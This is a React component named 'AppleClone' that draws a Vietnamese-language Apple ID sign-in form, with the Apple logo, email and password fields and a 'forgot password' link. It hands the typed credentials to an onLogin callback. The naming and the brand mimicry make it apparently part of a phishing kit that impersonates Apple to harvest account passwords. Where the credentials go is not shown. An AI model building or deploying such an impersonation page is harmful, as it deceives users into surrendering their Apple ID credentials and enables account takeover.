import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Apple, Eye, EyeOff, Loader } from 'lucide-react';

const AppleClone = ({ onLogin, isLoading }) => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);

    const handleSubmit = (e) => {
        e.preventDefault();
        if (username && password) {
            onLogin({ username, password });
        }
    };

    return (
        <div 
            className="w-full flex flex-col justify-center h-full p-4 sm:p-6 text-center"
        >
            <Apple className="w-12 h-12 sm:w-16 sm:h-16 mx-auto text-gray-800 mb-4" />
            <h1 className="text-2xl sm:text-3xl font-bold">Đăng nhập bằng Apple ID</h1>
            <form onSubmit={handleSubmit} className="space-y-4 max-w-sm mx-auto w-full mt-6">
                <div>
                    <Input
                        type="email"
                        placeholder="Apple ID (email)"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-gray-500 focus:border-gray-500 text-black placeholder-gray-500 bg-gray-50/80"
                    />
                </div>
                <div className="relative">
                    <Input
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Mật khẩu"
                        required
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-gray-500 focus:border-gray-500 text-black placeholder-gray-500 bg-gray-50/80 pr-10"
                    />
                    <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 hover:text-gray-700"
                        aria-label={showPassword ? "Ẩn mật khẩu" : "Hiện mật khẩu"}
                    >
                        {showPassword ? <EyeOff /> : <Eye />}
                    </button>
                </div>
                <Button
                    type="submit"
                    className="w-full bg-black hover:bg-gray-800 text-white font-bold py-3 text-base sm:text-lg rounded-md"
                    disabled={isLoading}
                >
                    {isLoading ? <Loader className="animate-spin" /> : 'Đăng nhập'}
                </Button>
            </form>
            <div className="text-center mt-4">
                <a href="#" className="text-xs sm:text-sm text-blue-600 hover:underline">
                    Quên Apple ID hoặc mật khẩu?
                </a>
            </div>
        </div>
    );
};

export default AppleClone;